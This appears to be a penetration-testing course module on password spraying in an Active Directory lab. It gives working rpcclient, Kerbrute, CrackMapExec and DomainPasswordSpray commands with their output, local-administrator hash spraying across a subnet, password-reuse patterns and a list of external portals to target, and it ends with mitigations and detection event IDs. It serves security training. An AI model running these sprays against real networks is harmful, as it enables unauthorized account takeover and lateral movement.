# Table of Contents

- [Internal Password Spraying - from Linux](#internal-password-spraying---from-linux)
  - [Internal Password Spraying from a Linux Host](#internal-password-spraying-from-a-linux-host)
  - [Local Administrator Password Reuse](#local-administrator-password-reuse)
- [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
- [Mitigations](#mitigations)
- [Detection](#detection)
- [External Password Spraying](#external-password-spraying)

---

# Internal Password Spraying - from Linux

Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.

## Internal Password Spraying from a Linux Host

Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. `Rpcclient` is an excellent option for performing this attack from Linux. An important consideration is that a **valid login is not immediately apparent** with `rpcclient`, with the response `Authority Name` indicating a successful login. We can filter out invalid login attempts by `grepping` for `Authority` in the response. The following Bash one-liner can be used to perform the attack.

**Using a Bash one-liner for the Attack:**
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

- We can also use `Kerbrute` for the same attack as discussed previously.

**Using Kerbrute for the Attack:**
```
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

- There are multiple other methods for performing password spraying from Linux. Another great option is using `CrackMapExec`. The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. Here we grep for `+` to filter out logon failures and hone in on only valid login attempts to ensure we don't miss anything by scrolling through many lines of output.

**Using CrackMapExec & Filtering Logon Failures:**
```
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

After getting one (or more!) hits with our password spraying attack, we can then use `CrackMapExec` to validate the credentials quickly against a Domain Controller.

**Validating the Credentials with CrackMapExec:**
```
$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

---

## Local Administrator Password Reuse

Internal password spraying isn't limited to domain accounts. If you obtain administrative access and the NTLM hash or cleartext password for the local administrator (or other privileged local account), attempt it across multiple network hosts. Local administrator password reuse is common due to gold images in automated deployments and centralized password management practices.

CrackMapExec is effective for this attack. Target high-value hosts like `SQL` or `Microsoft Exchange` servers, which are more likely to have privileged users logged in or credentials in memory.

**Password patterns to consider:**
* If a desktop's local admin password is `$desktop%@admin123`, try `$server%@admin123` on servers
* Non-standard local accounts (e.g., `bsmith`) may share passwords with similarly named domain accounts
* Domain user passwords (e.g., `ajones`) may be reused for admin accounts (e.g., `ajones_adm`)
* Credentials may work across domain trusts for users with identical or similar usernames

**NTLM hash spraying:** If you only retrieve the local administrator NTLM hash from the SAM database, spray it across subnets to find accounts with the same password. Use the `--local-auth` flag with tools like CrackMapExec to attempt login only once per machine, **preventing domain-wide account lockouts of the built-in administrator account**. Without this flag, the tool authenticates using the current domain, risking rapid account lockouts.

**Local Admin Spraying with CrackMapExec:**
```
$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

---

# Internal Password Spraying - from Windows

From a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. When authenticated to the domain, it automatically:
* Generates a user list from Active Directory
* Queries the domain password policy
* Excludes accounts within one attempt of lockout

Like Linux-based spraying, you can supply a custom user list when on a Windows host but not domain-authenticated.

**Common scenarios:**
* Testing from a client-provided managed Windows device
* Physical on-site testing from a Windows VM
* Post-initial-foothold authentication to a domain host, then spraying to obtain credentials for accounts with elevated domain privileges

There are several options available to us with the tool. Since the host is **domain-joined**, we will **skip** the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.

**Using DomainPasswordSpray.ps1**
```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

---

# Mitigations

No single solution prevents password spraying, but a defense-in-depth approach makes attacks extremely difficult:

**Multi-factor Authentication (MFA)**
Greatly reduces password spraying risk. Types include push notifications, rotating OTPs (Google Authenticator), RSA keys, or SMS confirmations. Note: some MFA implementations still disclose valid username/password combinations, allowing credential reuse against other services. Implement MFA on all external portals.

**Restricting Access**
Apply least privilege principles—many applications allow any domain user to log in unnecessarily. Restrict application access to only those who need it for their role.

**Reducing Impact of Successful Exploitation**
- Separate privileged user accounts for administrative activities
- Implement application-specific permission levels
- Use network segmentation to isolate compromised subnets and slow/stop lateral movement

**Password Hygiene**
- Educate users on strong passphrases
- Deploy password filters blocking dictionary words, months, seasons, and company name variations
- This significantly reduces valid password selection for spraying attempts

---

# Detection

**Indicators of external password spraying:**
- Many account lockouts in a short period
- Server/application logs showing numerous login attempts with valid or non-existent users
- Many requests to a specific application/URL in a short timeframe

**Domain Controller security log indicators:**

**Event ID 4625** (An account failed to log on): Multiple instances over a short period may indicate password spraying. Organizations should correlate many logon failures within a set time interval to trigger alerts.

**Event ID 4771** (Kerberos pre-authentication failed): May indicate LDAP password spraying attempts by sophisticated attackers avoiding SMB. Requires enabling Kerberos logging.

Organizations should research Windows Security Event Logging techniques for detecting password spraying attacks.

With fine-tuned mitigations and proper logging enabled, organizations can effectively detect and defend against both internal and external password spraying attacks.

---

# External Password Spraying

While outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:

* Microsoft 0365
* Outlook Web Exchange
* Exchange Web Access
* Skype for Business
* Lync Server
* Microsoft Remote Desktop Services (RDS) Portals
* Citrix portals using AD authentication
* VDI implementations using AD authentication such as VMware Horizon
* VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
* Custom web applications that use AD authentication

---
